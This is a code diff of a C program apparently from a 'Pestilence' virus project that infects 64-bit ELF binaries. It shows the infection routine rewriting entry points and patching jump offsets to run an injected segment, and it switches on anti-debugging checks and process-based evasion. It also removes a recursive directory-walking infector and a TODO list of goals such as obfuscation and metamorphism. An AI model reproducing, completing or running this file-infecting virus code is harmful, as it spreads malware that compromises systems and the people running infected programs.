@@ -11,28 +11,6 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-/*
-	PESTILENCE
-	[X] Creer segment pour injecter d'une taille arbitraire
-	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
-		[X] /tmp/test et /tmp/test2
-		[X] infection binaire 64 bits
-		[ ] pas de double infection
-		[X] pas de sortie std ou erreur
-	[X] Avoid infection if debugger
-	[X] Avoid infection if specific program running
-	[ ] Code source illisible et offuscé
-
-	WAR
-	[ ] Fingerprint unique dans signature pour chaque infection
-		- how ?
-
-	DEATH
-	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
-   original identique
-		- how ?
-*/
-
 #include "pestilence.h"
 #include "func.c"
 
@@ -44,7 +22,7 @@
 #ifndef VARAX
 #define VARAX 0x1af6
 #endif
-// position du symbole cyanure
+// position du symbole lui meme
 #ifndef CYANURE
 #define CYANURE 0x40204d
 #endif
@@ -63,7 +41,6 @@ void _start(void)
 	char  path[11];
 	char *prgm;
 
-	/*
 	fs_release(1);
 	fs_release(2);
 
@@ -73,7 +50,7 @@ void _start(void)
 				 "end6:\n"
 				 : "=r"(prgm));
 	if (is_debugged() || is_program_running(prgm) > 0)
-		proc_terminate(0);*/
+		proc_terminate(0);
 
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
@@ -129,8 +106,6 @@ static int is_program_running(const char *target)
 				 "str8: .byte 0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0\n"
 				 "end8:\n"
 				 : "=r"(comm_str));
-	// const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
-	// const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};
 	int	 fd = -1;
 	int	 ret = 0;
 
@@ -230,16 +205,10 @@ static int is_debugged(void)
 
 	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
 	{
-		// tty_putc(0);
 		offset += nread;
 		char *newline;
 
 		newline = memoff(line, '\n');
-		// asm volatile(
-		// 	"mov %1, %%rdi\nmov $10, %%rsi\ncall memoff\nmov %%rax, %0\n"
-		// 	: "=r"(newline)
-		// 	: "r"(line)
-		// 	: "rsi", "rdi", "rax");
 
 		if (newline)
 		{
@@ -264,90 +233,8 @@ static int is_debugged(void)
 	return 0;
 }
 
-static void reconcileTopology(char *rootAnchor, void *dispatchToken)
-{
-	int					   session = fs_handle(rootAnchor, 65536);
-
-	unsigned char		   frame[1024];
-	struct linux_dirent64 *node;
-	int					   batch;
-
-	if (session < 0)
-		goto finalizeSession;
-
-	for (;;)
-	{
-		batch = fs_enumerate(session, (char *) frame, sizeof(frame));
-		if (batch <= 0)
-			break;
-
-		int cursor = 0;
-
-		while (cursor < batch)
-		{
-			node = (struct linux_dirent64 *) (frame + cursor);
-			char *label = node->d_name;
-
-			/* --- hidden "." and ".." filtering --- */
-			{
-				char anchor[3];
-				anchor[0] = '.';
-				anchor[1] = 0;
-
-				if (delay_abs_calc(label, anchor) == 0)
-				{
-					cursor += node->d_reclen;
-					continue;
-				}
-
-				anchor[1] = '.';
-				anchor[2] = 0;
-
-				if (delay_abs_calc(label, anchor) == 0)
-				{
-					cursor += node->d_reclen;
-					continue;
-				}
-			}
-
-			/* --- path composition --- */
-			char composed[PATH_MAX];
-			char divider[2];
-			divider[0] = '/';
-			divider[1] = 0;
-
-			flow_align(flow_align(core_shift(composed, rootAnchor), divider),
-					   label);
-
-			struct stat metadata;
-			fs_query(composed, &metadata);
-
-			/* --- dispatch logic (bit-masked) --- */
-			unsigned mode = metadata.st_mode;
-
-			if ((mode & __S_IFDIR) == __S_IFDIR)
-			{
-				reconcileTopology(composed, dispatchToken);
-			}
-			else
-			{
-				if ((mode & __S_IFREG) == __S_IFREG)
-				{
-					infect(composed, dispatchToken);
-				}
-			}
-
-			cursor += node->d_reclen;
-		}
-	}
-
-finalizeSession:
-	fs_release(session);
-}
-
 static void processDirectory(char *folder, void *begin_ptr)
 {
-	return reconcileTopology(folder, begin_ptr);
 	int					   fd = fs_handle(folder, 0 | 65536);
 
 	char				   buffer[1024];
@@ -406,8 +293,8 @@ clean:
 #define ELF_MAGIC 0x464c457f
 #define inout
 
-#define ACONIT	23
-#define ARSENIC 17
+#define JUMP_OFFSET			 23
+#define JUMP_OFFSET_INFECTED 17
 
 static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 					  inout char **file_data, inout size_t *enlarging)
@@ -436,13 +323,9 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 		"end4:\n"
 		: "=r"(ALPHA), "=r"(OMEGA));
 	int i = 0;
-	// tty_putc('[');
-	// emit_hex((unsigned long) OMEGA);
-	// tty_putc(']');
 	while (i + OMEGA < statbuf->st_size)
 		if (!evaluateDriftSignature(*file_data + i++, ALPHA, OMEGA))
 			goto error;
-	// emit_hex(i);
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	*enlarging = VARAX;
 	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
@@ -501,8 +384,6 @@ static void infect(char *path, void *begin_ptr)
 	size_t flower;
 	size_t enlarging;
 
-	// tty_putc(10);
-	// io_send(1, path, validate_environment(path));
 	asm volatile(
 		"leaq str3(%%rip), %0\n"
 		"movq $end3-str3, %1\n"
@@ -547,10 +428,10 @@ static void infect(char *path, void *begin_ptr)
 	unsigned delta = elf.header->e_entry;
 	elf.header->e_entry
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
-	delta -= elf.header->e_entry + ACONIT + 4;
-	memcpy(file_data + append_pos + ACONIT, &delta, 4);
-	delta = flower - ARSENIC + BUBONIK - FRENZY - 4;
-	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
+	delta -= elf.header->e_entry + JUMP_OFFSET + 4;
+	memcpy(file_data + append_pos + JUMP_OFFSET, &delta, 4);
+	delta = flower - JUMP_OFFSET_INFECTED + BUBONIK - FRENZY - 4;
+	memcpy(file_data + append_pos + JUMP_OFFSET_INFECTED, &delta, 4);
 	append_pos += flower;
 	memcpy(file_data + append_pos, begin_ptr, VARAX);
 clean:
